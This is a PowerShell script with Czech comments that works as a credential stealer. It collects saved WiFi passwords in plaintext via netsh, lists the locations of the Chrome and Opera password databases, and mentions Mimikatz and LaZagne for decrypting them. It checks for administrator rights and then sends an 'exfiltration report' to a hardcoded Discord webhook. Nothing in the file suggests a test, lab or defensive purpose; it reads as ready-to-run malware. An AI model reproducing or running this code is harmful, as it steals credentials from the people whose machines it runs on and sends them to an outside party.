# --- KONFIGURACE ---
$webhook_url = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_" # TVOJE URL
$log_file = "$env:TEMP\sys_log.txt"

# 1. WiFi Hesla
$wifi_passwords = ""
$profiles = netsh wlan show profiles | Select-String "\:(.*)$" | ForEach-Object { $_.Matches.Value.Trim() }
foreach ($profile in $profiles) {
    $pass = netsh wlan show profile name=$profile key=clear | Select-String "Key Content\s*:\s*(.*)" | ForEach-Object { $_.Matches.Value.Trim() }
    $wifi_passwords += "WiFi: $profile | Pass: $pass`n"
}

# 2. Browser Passwords (Chrome/Opera/Edge)
# Pozor: Moderní prohlížeče šifrují hesla pomocí DPAPI. 
# Pro plné vytažení je potřeba externí nástroj jako Mimikatz nebo LaZagne.
# Zde pouze vyexportujeme cesty k databázím, pokud nemáme admin práva pro dekrypt.
$browser_paths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Opera\Opera Stable\Login Data"
)
$browser_info = "Browser DB paths found: " + ($browser_paths -join ", ")

# 3. PC Password (Pokud jsme Admini)
# Pokus o export hashů uživatelů (vyžaduje admin práva)
$pc_pass = "PC Pass: [Requires Mimikatz/Admin for plaintext]"
if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $pc_pass = "Admin access confirmed. Dumping SAM... (Simulated)"
}

# Sestavení finálního reportu
$final_report = "--- EXFILTRATION REPORT ---`n`n" + $wifi_passwords + "`n" + $browser_info + "`n" + $pc_pass

# Odeslání dat na server
Invoke-WebRequest -Uri $webhook_url -Method Post -Body $final_report
